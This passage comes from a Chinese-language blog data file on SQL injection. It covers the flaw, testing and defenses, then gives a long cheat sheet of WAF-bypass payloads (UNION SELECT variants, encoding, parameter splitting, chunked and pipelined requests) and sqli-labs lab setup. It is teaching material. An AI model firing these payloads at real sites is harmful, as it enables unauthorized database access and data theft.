参数用户可控。\n- 参数带入数据库查询。\n\n**测试方法**\n\n​\t在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1=1 和 and 1=2 以及字符型注入进行判断。\n\n**修复方法**\n\n​\t在代码层最佳的防御SQL注入的手段是SQL语句的**预编译和绑定变量**。\n\n​\t（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。\n\n​\t（2）对进入数据库的特殊字符（ ' <>&*; 等）进行转义处理，或编码转换。\n\n​\t（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。\n\n​\t（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 \n\n​\t（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 \n\n​\t（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 \n\n​\t（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。\n\n\n\n### 1.1 MySQL相关知识\n\n​\t在**mysql5**版本以后，存在一个数据库为`information_schema`，在这个库里面，有三个重要的表：`columns`，`tables`，`SCHEMATA`表，在`SCHEMATA`表中的字段`SCHEMA_NAME`存放着数据库的信息。`tables`表中`TABLE_SCHEMA`和`TABLE_NAME`分别记录库名和表名。`columns`存储该用户创建的所有数据库的库名、表名和字段名。\n\n\n\n\n### 1.2 判断是否存在注入\n\n```sql\nid=1 and 1=1\nid=1 and 1=2\nid=1 or 1=1\nid='1'or'1'='1'\nid=\"1\"or\"1\"=\"1\"\n```\n\n**有回显**：页面有数据信息返回。\n\n**无回显**：输入不同语句，页面无任何变化。\n\n\n\n### 1.3 SQL注释符\n\n`#`：单行注释，常编码为%23。\n\n`--空格`：单行注释，注意后面有个空格。\n\n`/**/`：多行注释，至少存在两处的注入，也常用来作为空格绕过。\n\n\n\n### 1.4 SQL注入分类\n\n按注入手法来分：**联合查询、堆叠查询、布尔型、报错型、基于时间延迟**。\n\n按请求类型来分：**GET注入、POST注入、COOKIE注入。**\n\n按注入数据类型来分：**int型、string型、like型**\n\n\n\n## 2. SQL注入绕过\n\n\n### 2.1 空格字符绕过\n\n`%a0`：空格\n\n`%09`：TAB键（水平）\n\n`%0a`：新建一行\n\n`%0c`：新的一页\n\n`%0d`：return功能\n\n`%0b`：TAB键（垂直）\n\n`%00`：空字符\n\n`/**/`：替换空格\n\n`/*!*/`：内联注释\n\n\n\n### 2.2 大小写绕过\n\n```sql\nunion select -> UniOn SelEcT\n```\n\n\n\n### 2.3 浮点数绕过\n\n```sql\nselect * from users where id=8E0union select 1,2,3,4;\nselect * from users where id=8.0union select 1,2,3,4;\n```\n\n\n\n### 2.4 NULL绕过\n\n`\\N`代表NULL\n\n\n\n### 2.5 引号绕过\n\n```sql\nselect * from users where id=\"1\" #双引号绕过\nselect * from users where username=0x61646D696E; # 字符串转换为16进制\nselect * from users where id=-1 union select 1,2,(select group_concat(column_name)\nfrom information_schema.columns where TABLE_NAME='users' limit 1),4; # 如果开启gpc，整数型也可以用十六进制绕过\n```\n\n\n\n### 2.6 添加库名绕过\n\n```sql\nselect * from users where id=-1 union select 1,2,3,4 from users;\nselect * from users where id=-1 union select 1,2,3,4 from test.users;\n```\n\n\n\n### 2.7 去重复绕过\n\n在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。\n\n```sql\nselect * from users where id=-1 union distinct select 1,2,3,4 from users;\nselect * from users where id=-1 union distinct select 1,2,3,version() fromusers;\n```\n\n\n\n### 2.8 反引号绕过\n\n字段加反引号可以绕过一些WAF拦截。\n\n```sql\nselect * from users where id=-1 union select 1,2,3,4 from `test.users`;\n```\n\n\n\n### 2.9 语言特性绕过\n\n在 php 语言中 id=1&id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。\n\n|               服务器中间件                |          解析结果          |       举例说明       |\n| :---------------------------------------: | :------------------------: | :------------------: |\n|                ASP.NET/IIS                | 所有出现的参数值用逗号连接 |    color=red,blue    |\n|                  ASP/IIS                  |  所有出现的参数用逗号连接  |    color=red,blue    |\n|                PHP/Apache                 |    仅最后一次出现参数值    |      color=blue      |\n|                 PHP/Zeus                  |    仅最后一次出现参数值    |      color=blue      |\n|         JSP,Servlet/Apache Tomcat         |     仅第一次出现参数值     |      color=red       |\n| JSP,Servlet/Oracle Application Server 10g |     仅第一次出现参数值     |      color=red       |\n|             JSP,Servlet/Jetty             |     仅第一次出现参数值     |      color=red       |\n|             IBM Lotus Domino              |    仅最后一次出现参数值    |      color=blue      |\n|              IBM HTTP Server              |     仅第一次出现参数值     |      color=red       |\n|         mod_perl,libapreq2/Apache         |     仅第一次出现参数值     |      color=red       |\n|              Perl CGI/Apache              |     仅第一次出现参数值     |      color=red       |\n|          mod_wsgi(Python)/Apache          |     仅第一次出现参数值     |      color=red       |\n|                Python/Zope                |         转化为List         | color=['red','blue'] |\n\n\n\n### 2.10 逗号绕过\n\n`substr`\n\n```sql\nselect(substr(database() from 1 for 1);\n```\n\n`mid`\n\n```sql\nselect mid(database() from 1 for 1);\n```\n\n`join`\n\n```sql\nunion select * from 1,2\nunion select * from (select 1)a join (select 2)b\n```\n\n`like`\n\n```sql\nselect user() like '%r%';\n```\n\n`offset`\n\n```sql\nlimit 1 offset 0\n```\n\n\n\n### 2.11 or and xor not绕过\n\n`&&`等价于and\n\n`||`等价于or\n\n`!`等价于not\n\n`|`等价于xor\n\n\n\n### 2.12 ASCII字符对比绕过\n\n```sql\nselect * from users where id=1 and ascii(substring(user(),1,1))=114; # char(114)='r'\n```\n\n\n\n### 2.13 等号绕过\n\n```sql\nascii(substring(user(),1,1))<115; # > <\nselect substring(user(),1,1)like 'r%'; #like rlike\nselect user() regexp '^r'; # regexp\n```\n\n\n\n### 2.14 双写绕过\n\n```sql\nuniunionon seleselectct\n```\n\n\n\n### 2.15 二次编码绕过\n\n`-1 union select 1,2,3,4# `\n\n第一次编码：\n\n`%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 `\n\n第二次编码：\n\n`%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33`\n\n\n\n### 2.16 参数拆分绕过\n\n对于a=[input1]&b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了`union select`，可以使用参数拆分\n\n```sql\n-1'union/*&username=*/select 1,user(),3,4--+\n```\n\n\n\n### 2.17 生僻函数绕过\n\n```sql\nselect polygon((select * from (select * from (select @@version) f) x)); # polygon()替换updatexml()\n```\n\n\n\n### 2.18 分块传输绕过\n\n​\t如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。\n\n​\t接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF(\"\\r\\n\")。然后是数据本身，数据结束后，还会有CRLF(\"\\r\\n\")两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。\n\n\n\n### 2.19 信任白名单绕过\n\nWAF会自带一些文件白名单，可以利用白名单绕过\n\n```sql\n/phpmyadmin?name=%27%20union%20select%201,user()--+&submit=1\n\n```\n\n\n\n### 2.20 pipline绕过\n\n​\thttp 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，Apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。\n\n​\t用 burpsuite 抓包提交，复制整个包信息放在第一个包最后，把第一个包close 改成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉，有些WAF不会对第一个包的参数进行检测。\n\n\n\n### 2.21 利用multipart/form-data绕过\n\n​\tmultipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。\n\n\n\n### 2.22 order by 绕过\n\n```sql\nselect * from users where id=1 into @a,@b,@c,@d; # 替代order by猜解字段数\n```\n\n\n\n### 2.23 修改请求方式绕过\n\n```php\n<?php\necho $_REQUEST['id'];\n?>\n```\n\n可以更改请求方式尝试绕过。\n\n\n\n### 2.24 大量字符绕过\n\n```sql\nid=1 and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*/1,user()\n```\n\n\n\n### 2.25 花括号绕过\n\n```sql\nselect 1,2 union select{x 1},user(); # 花括号左边是注释的内容\n```\n\n\n\n### 2.26 union select绕过\n\n```sql\nsel<>ect # 程序过滤<>为空 脚本处理\nsele/**/ct # 程序过滤/**/为空\n/*!%53eLEct*/ # url 编码与内联注释\nse%0blect # 使用空格绕过\nsele%ct # 使用百分号绕过\n%53eLEct # 编码绕过\nuNIoN sELecT 1,2\nunion all select 1,2\nunion DISTINCT select 1,2\nnull+UNION+SELECT+1,2\n/*!union*//*!select*/1,2\nunion/**/select/**/1,2\nand(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()\n/*!50000union*//*!50000select*/1,2\n/*!40000union*//*!40000select*/1,2\n%0aunion%0aselect 1,2\n%250aunion%250aselect 1,2\n%09union%09select 1,2\n%0caunion%0cselect 1,2\n%0daunion%0dselect 1,2\n%0baunion%0bselect 1,2\n%0d%0aunion%0d%0aselect 1,2\n--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2\n/*!12345union*//*!12345select*/1,2;\n/*中文*/union/*中文*/select/*中文*/1,2;\n/* */union/* */select/ */1,2;\n/*!union*//*!00000all*//*!00000select*/1,2\n```\n\n\n\n\n\n## 3. sqli-labs通关\n\n### 3.1 准备工作\n\n**sqli-labs环境搭建**\n\n```bash\ndocker pull acgpiano/sqli-labs\ndocker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest\n```\n\n中间可能报错，只需要关闭代理就行。\n\n```bash\nError response from daemon: Head \"https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest\": Get \"https://auth.docker.io/token?account=squarehhh&scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&service=registry.docker.io\": EOF\n```\n\n访问网页，环境搭建完毕。\n\n![image-20250305014536324](sql注入/image-20250305014536324.png)\n\n查看相关版本细节。\n\n```bash\n$ docker exec -it sqli-labs /bin/bash\n$ mysql -e \"select version(),user()\"\n+-------------------------+----------------+\n| version()               | user()         |\n+-------------------------+----------------+\n| 5.5.44-0ubuntu0.14.04.1 | root@localhost |\n+-------------------------+----------------+\n$ php --version\nPHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)\nCopyright (c) 1997-2014 The PHP Group\nZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies\n    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies\n$ cd /etc/init.d/ && apache2 -v\nServer version: Apache/2.4.7 (Ubuntu)\nServer built:   Oct 14 2015 14:20:21\n```\n\n","source":"_posts/sql注入.md","raw":"---\ntitle: sql注入\nhide: false\ntags:\n  - 网络安全\nabbrlink: 31899\ndate: 2025-03-04 22:43:25\n---\n\n\n\n## 1. 概述\n\n**漏洞描述**\n\n​\tWeb程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。\n\n**漏洞存在条件**\n\n- 参数用户可控。\n- 参数带入数据库查询。\n\n**测试方法**\n\n​\t在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1=1 和 and 1=2 以及字符型注入进行判断。\n\n**修复方法**\n\n​\t在代码层最佳的防御SQL注入的手段是SQL语句的**预编译和绑定变量**。\n\n​\t（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。\n\n​\t（2）对进入数据库的特殊字符（ ' <>&*; 等）进行转义处理，或编码转换。\n\n​\t（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。\n\n​\t（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 \n\n​\t（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 \n\n​\t（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 \n\n​\t（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。\n\n\n\n### 1.1 MySQL相关知识\n\n​\t在**mysql5**版本以后，存在一个数据库为`information_schema`，在这个库里面，有三个重要的表：`columns`，`tables`，`SCHEMATA`表，在`SCHEMATA`表中的字段`SCHEMA_NAME`存放着数据库的信息。`tables`表中`TABLE_SCHEMA`和`TABLE_NAME`分别记录库名和表名。`columns`存储该用户创建的所有数据库的库名、表名和字段名。\n\n\n\n\n### 1.2 判断是否存在注入\n\n```sql\nid=1 and 1=1\nid=1 and 1=2\nid=1 or 1=1\nid='1'or'1'='1'\nid=\"1\"or\"1\"=\"1\"\n```\n\n**有回显**：页面有数据信息返回。\n\n**无回显**：输入不同语句，页面无任何变化。\n\n\n\n### 1.3 SQL注释符\n\n`#`：单行注释，常编码为%23。\n\n`--空格`：单行注释，注意后面有个空格。\n\n`/**/`：多行注释，至少存在两处的注入，也常用来作为空格绕过。\n\n\n\n### 1.4 SQL注入分类\n\n按注入手法来分：**联合查询、堆叠查询、布尔型、报错型、基于时间延迟**。\n\n按请求类型来分：**GET注入、POST注入、COOKIE注入。**\n\n按注入数据类型来分：**int型、string型、like型**\n\n\n\n## 2. SQL注入绕过\n\n\n### 2.1 空格字符绕过\n\n`%a0`：空格\n\n`%09`：TAB键（水平）\n\n`%0a`：新建一行\n\n`%0c`：新的一页\n\n`%0d`：return功能\n\n`%0b`：TAB键（垂直）\n\n`%00`：空字符\n\n`/**/`：替换空格\n\n`/*!*/`：内联注释\n\n\n\n### 2.2 大小写绕过\n\n```sql\nunion select -> UniOn SelEcT\n```\n\n\n\n### 2.3 浮点数绕过\n\n```sql\nselect * from users where id=8E0union select 1,2,3,4;\nselect * from users where id=8.0union select 1,2,3,4;\n```\n\n\n\n### 2.4 NULL绕过\n\n`\\N`代表NULL\n\n\n\n### 2.5 引号绕过\n\n```sql\nselect * from users where id=\"1\" #双引号绕过\nselect * from users where username=0x61646D696E; # 字符串转换为16进制\nselect * from users where id=-1 union select 1,2,(select group_concat(column_name)\nfrom information_schema.columns where TABLE_NAME='users' limit 1),4; # 如果开启gpc，整数型也可以用十六进制绕过\n```\n\n\n\n### 2.6 添加库名绕过\n\n```sql\nselect * from users where id=-1 union select 1,2,3,4 from users;\nselect * from users where id=-1 union select 1,2,3,4 from test.users;\n```\n\n\n\n### 2.7 去重复绕过\n\n在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破waf 拦截。\n\n```sql\nselect * from users where id=-1 union distinct select 1,2,3,4 from users;\nselect * from users where id=-1 union distinct select 1,2,3,version() fromusers;\n```\n\n\n\n### 2.8 反引号绕过\n\n字段加反引号可以绕过一些WAF拦截。\n\n```sql\nselect * from users where id=-1 union select 1,2,3,4 from `test.users`;\n```\n\n\n\n### 2.9 语言特性绕过\n\n在 php 语言中 id=1&id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。\n\n|               服务器中间件                |          解析结果          |       举例说明       |\n| :---------------------------------------: | :------------------------: | :------------------: |\n|                ASP.NET/IIS                | 所有出现的参数值用逗号连接 |    color=red,blue    |\n|                  ASP/IIS                  |  所有出现的参数用逗号连接  |    color=red,blue    |\n|                PHP/Apache                 |    仅最后一次出现参数值    |      color=blue      |\n|                 PHP/Zeus                  |    仅最后一次出现参数值    |      color=blue      |\n|         JSP,Servlet/Apache Tomcat         |     仅第一次出现参数值     |      color=red       |\n| JSP,Servlet/Oracle Application Server 10g |     仅第一次出现参数值     |      color=red       |\n|             JSP,Servlet/Jetty             |     仅第一次出现参数值     |      color=red       |\n|             IBM Lotus Domino              |    仅最后一次出现参数值    |      color=blue      |\n|              IBM HTTP Server              |     仅第一次出现参数值     |      color=red       |\n|         mod_perl,libapreq2/Apache         |     仅第一次出现参数值     |      color=red       |\n|              Perl CGI/Apache              |     仅第一次出现参数值     |      color=red       |\n|          mod_wsgi(Python)/Apache          |     仅第一次出现参数值     |      color=red       |\n|                Python/Zope                |         转化为List         | color=['red','blue'] |\n\n\n\n### 2.10 逗号绕过\n\n`substr`\n\n```sql\nselect(substr(database() from 1 for 1);\n```\n\n`mid`\n\n```sql\nselect mid(database() from 1 for 1);\n```\n\n`join`\n\n```sql\nunion select * from 1,2\nunion select * from (select 1)a join (select 2)b\n```\n\n`like`\n\n```sql\nselect user() like '%r%';\n```\n\n`offset`\n\n```sql\nlimit 1 offset 0\n```\n\n\n\n### 2.11 or and xor not绕过\n\n`&&`等价于and\n\n`||`等价于or\n\n`!`等价于not\n\n`|`等价于xor\n\n\n\n### 2.12 ASCII字符对比绕过\n\n```sql\nselect * from users where id=1 and ascii(substring(user(),1,1))=114; # char(114)='r'\n```\n\n\n\n### 2.13 等号绕过\n\n```sql\nascii(substring(user(),1,1))<115; # > <\nselect substring(user(),1,1)like 'r%'; #like rlike\nselect user() regexp '^r'; # regexp\n```\n\n\n\n### 2.14 双写绕过\n\n```sql\nuniunionon seleselectct\n```\n\n\n\n### 2.15 二次编码绕过\n\n`-1 union select 1,2,3,4# `\n\n第一次编码：\n\n`%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23 `\n\n第二次编码：\n\n`%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33`\n\n\n\n### 2.16 参数拆分绕过\n\n对于a=[input1]&b=[input2] 可以将参数 a 和 b 拼接在 SQL 语句中，但是过滤了`union select`，可以使用参数拆分\n\n```sql\n-1'union/*&username=*/select 1,user(),3,4--+\n```\n\n\n\n### 2.17 生僻函数绕过\n\n```sql\nselect polygon((select * from (select * from (select @@version) f) x)); # polygon()替换updatexml()\n```\n\n\n\n### 2.18 分块传输绕过\n\n​\t如果在 http 的消息头里 Transfer-Encoding 为 chunked，那么就是使用chunk编码方式。\n\n​\t接下来会发送数量未知的块，每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF(\"\\r\\n\")。然后是数据本身，数据结束后，还会有CRLF(\"\\r\\n\")两个字符。有一些实现中，块大小的十六进制数和CRLF 之间可以有空格，最后一块大小为0，表示数据发送结束。\n\n\n\n### 2.19 信任白名单绕过\n\nWAF会自带一些文件白名单，可以利用白名单绕过\n\n```sql\n/phpmyadmin?name=%27%20union%20select%201,user()--+&submit=1\n\n```\n\n\n\n### 2.20 pipline绕过\n\n​\thttp 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接 tcp 连接，然后发送 http 数据包（即我们用burpsuite 截获的数据），其中包含了一个 Connection 字段，一般值为 close，Apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的http 请求所建立的tcp连接不断开，直到所发送内容结束 Connection 为 close 为止。\n\n​\t用 burpsuite 抓包提交，复制整个包信息放在第一个包最后，把第一个包close 改成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉，有些WAF不会对第一个包的参数进行检测。\n\n\n\n### 2.21 利用multipart/form-data绕过\n\n​\tmultipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。\n\n\n\n### 2.22 order by 绕过\n\n```sql\nselect * from users where id=1 into @a,@b,@c,@d; # 替代order by猜解字段数\n```\n\n\n\n### 2.23 修改请求方式绕过\n\n```php\n<?php\necho $_REQUEST['id'];\n?>\n```\n\n可以更改请求方式尝试绕过。\n\n\n\n### 2.24 大量字符绕过\n\n```sql\nid=1 and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)/*!union*//*!select*/1,user()\n```\n\n\n\n### 2.25 花括号绕过\n\n```sql\nselect 1,2 union select{x 1},user(); # 花括号左边是注释的内容\n```\n\n\n\n### 2.26 union select绕过\n\n```sql\nsel<>ect # 程序过滤<>为空 脚本处理\nsele/**/ct # 程序过滤/**/为空\n/*!%53eLEct*/ # url 编码与内联注释\nse%0blect # 使用空格绕过\nsele%ct # 使用百分号绕过\n%53eLEct # 编码绕过\nuNIoN sELecT 1,2\nunion all select 1,2\nunion DISTINCT select 1,2\nnull+UNION+SELECT+1,2\n/*!union*//*!select*/1,2\nunion/**/select/**/1,2\nand(select 1)=(Select 0xA*1000)/*!uNIOn*//*!SeLECt*/ 1,user()\n/*!50000union*//*!50000select*/1,2\n/*!40000union*//*!40000select*/1,2\n%0aunion%0aselect 1,2\n%250aunion%250aselect 1,2\n%09union%09select 1,2\n%0caunion%0cselect 1,2\n%0daunion%0dselect 1,2\n%0baunion%0bselect 1,2\n%0d%0aunion%0d%0aselect 1,2\n--+%0d%0aunion--+%0d%0aselect--+%0d%0a1,--+%0d%0a2\n/*!12345union*//*!12345select*/1,2;\n/*中文*/union/*中文*/select/*中文*/1,2;\n/* */union/* */select/ */1,2;\n/*!union*//*!00000all*//*!00000select*/1,2\n```\n\n\n\n\n\n## 3. sqli-labs通关\n\n### 3.1 准备工作\n\n**sqli-labs环境搭建**\n\n```bash\ndocker pull acgpiano/sqli-labs\ndocker run -dt --name sqli-labs -p 8888:80 acgpiano/sqli-labs:latest\n```\n\n中间可能报错，只需要关闭代理就行。\n\n```bash\nError response from daemon: Head \"https://registry-1.docker.io/v2/acgpiano/sqli-labs/manifests/latest\": Get \"https://auth.docker.io/token?account=squarehhh&scope=repository%3Aacgpiano%2Fsqli-labs%3Apull&service=registry.docker.io\": EOF\n```\n\n访问网页，环境搭建完毕。\n\n![image-20250305014536324](sql注入/image-20250305014536324.png)\n\n查看相关版本细节。\n\n```bash\n$ docker exec -it sqli-labs /bin/bash\n$ mysql -e \"select version(),user()\"\n+-------------------------+----------------+\n| version()               | user()         |\n+-------------------------+----------------+\n| 5.5.44-0ubuntu0.14.04.1 | root@localhost |\n+-------------------------+----------------+\n$ php --version\nPHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)\nCopyright (c) 1997-2014 The PHP Group\nZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies\n    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies\n$ cd /etc/init.d/ && apache2 -v\nServer version: Apache/2.4.7 (Ubuntu)\nServer built:   Oct 14 2015 14:20:21\n```\n\n","slug":"sql注入","published":1,"updated":"2025-03-04T18:03:29.030Z","comments":1,"layout":"post","photos":[],"_id":"cm7ussaxm0001asjfdcap15zx","content":"<h2 id=\"1-概述\"><a href=\"#1-概述\" class=\"headerlink\" title=\"1. 概述\"></a>1. 概述</h2><p><strong>漏洞描述</strong></p>\n<p>​\tWeb程序代码中对于用户提交的参数未做过滤，被放到SQL语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以及绕过登录限制等。</p>\n<p><strong>漏洞存在条件</strong></p>\n<ul>\n<li>参数用户可控。</li>\n<li>参数带入数据库查询。</li>\n</ul>\n<p><strong>测试方法</strong></p>\n<p>​\t在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and1=1 和 and 1=2 以及字符型注入进行判断。</p>\n<p><strong>修复方法</strong></p>\n<p>​\t在代码层最佳的防御SQL注入的手段是SQL语句的<strong>预编译和绑定变量</strong>。</p>\n<p>​\t（1）所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>\n<p>​\t（2）对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。</p>\n<p>​\t（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。</p>\n<p>​\t（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL 注入语句无法正确执行。 </p>\n<p>​\t（5）网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。 </p>\n<p>​\t（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击 对数据库的危害。 </p>\n<p>​\t（7）避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>\n<h3 id=\"1-1-MySQL相关知识\"><a href=\"#1-1-MySQL相关知识\" class=\"headerlink\" title=\"1.1 MySQL相关知识\"></a>1.1 MySQL相关知识</h3><p>​\t在<strong>mysql5</strong>版本以后，存在一个数据库为<code>information_schema</code>，在这个库里面，有三个重要的表：<code>columns</code>，<code>tables</code>，<code>SCHEMATA</code>表，在<code>SCHEMATA</code>表中的字段<code>SCHEMA_NAME</code>存放着数据库的信息。<code>tables</code>表中<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>分别记录库名和表名。<code>columns</code>存储该用户创建的所有数据库的库名、表名和字段名。</p>\n<h3 id=\"1-2-判断是否存在注入\"><a href=\"#1-2-判断是否存在注入\" class=\"headerlink\" title=\"1.2 判断是否存在注入\"></a>1.2 判断是否存在注入</h3><figure class=\"highlight sql\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">2</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"number\">1</span> <span class=\"keyword\">or</span> <span class=\"number\">1</span><span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">id<span class=\"operator\">=</span><span class=\"string\">'1'</span><span class=\"keyword\">or</span><span class=\"string\">'1'</span><span class=\"operator\">=</span><span class=\"string\">'1'</span></span><br><span class=\"line\">id<span class=\"operator\">=</span>\"1\"<span class=\"keyword\">or</span>\"1\"<span class=\"operator\">=</span>\"1\"</span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>有回显</strong>：页面有数据信息返回。</p>\n<p><strong>无回显</strong>：输入不同语句，页面无任何变化。</p>\n<h3 id=\"1-3-SQL注释符\"><a href=\"#1-3-SQL注释符\" class=\"headerlink\" title=\"1.3 SQL注释符\"></a>1.3 SQL注释符</h3><p><code>#</code>：单行注释，常编码为%23。</p>\n<p><code>--空格</code>：单行注释，注意后面有个空格。</p>\n<p><code>/**/</code>：多行注释，至少存在两处的注入，也常用来作为空格绕过。</p>\n<h3 id=\"1-4-SQL注入分类\"><a href=\"#1-4-SQL注入分类\" class=\"headerlink\" title=\"1.4 SQL注入分类\"></a>1.4 SQL注入分类</h3><p>按注入手法来分：<strong>联合查询、堆叠查询、布尔型、报错型、基于时间延迟</strong>。</p>\n<p>按请求类型来分：<strong>GET注入、POST注入、COOKIE注入。</strong></p>\n<p>按注入数据类型来分：<strong>int型、string型、like型</strong></p>\n<h2 id=\"2-SQL注入绕过\"><a href=\"#2-SQL注入绕过\" class=\"headerlink\" title=\"2. SQL注入绕过\"></a>2. SQL注入绕过</h2><h3 id=\"2-1-空格字符绕过\"><a href=\"#2-1-空格字符绕过\" class=\"headerlink\" title=\"2.1 空格字符绕过\"></a>2.1 